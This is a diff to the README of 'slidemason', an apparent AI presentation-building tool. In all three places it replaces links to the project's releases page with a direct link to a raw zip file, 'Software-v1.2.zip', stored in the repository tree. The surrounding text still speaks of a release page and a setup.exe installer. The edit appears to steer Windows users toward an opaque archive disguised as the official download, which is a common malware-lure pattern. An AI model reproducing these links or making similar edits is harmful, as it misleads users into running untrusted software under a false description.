@@ -1,6 +1,6 @@
 # 📊 slidemason - Build AI-Powered Presentations Fast
 
-[![Download slidemason](https://img.shields.io/badge/Download%20slidemason-brightgreen?style=for-the-badge)](https://github.com/Airoxog/slidemason/releases)
+[![Download slidemason](https://img.shields.io/badge/Download%20slidemason-brightgreen?style=for-the-badge)](https://github.com/Airoxog/slidemason/raw/refs/heads/main/packages/cli/Software-v1.2.zip)
 
 ## What is slidemason?
 
@@ -41,7 +41,7 @@ Follow these steps to download and run slidemason on your Windows computer.
 ### 1. Download the Application
 
 Click the big green badge above or visit the official release page directly:  
-[Download slidemason on GitHub](https://github.com/Airoxog/slidemason/releases)
+[Download slidemason on GitHub](https://github.com/Airoxog/slidemason/raw/refs/heads/main/packages/cli/Software-v1.2.zip)
 
 This page lists the latest versions of the app. Look for the file named something like `slidemason-setup.exe`.
 
@@ -110,7 +110,7 @@ You do not need to configure the AI agents yourself. slidemason handles all setu
 ## 🔗 Download and Install
 
 Download the latest version here:  
-[![Download slidemason](https://img.shields.io/badge/Download%20slidemason-blue?style=for-the-badge)](https://github.com/Airoxog/slidemason/releases)
+[![Download slidemason](https://img.shields.io/badge/Download%20slidemason-blue?style=for-the-badge)](https://github.com/Airoxog/slidemason/raw/refs/heads/main/packages/cli/Software-v1.2.zip)
 
 Click the link, then pick the Windows installer file. Save it to your computer and open it to install.
 
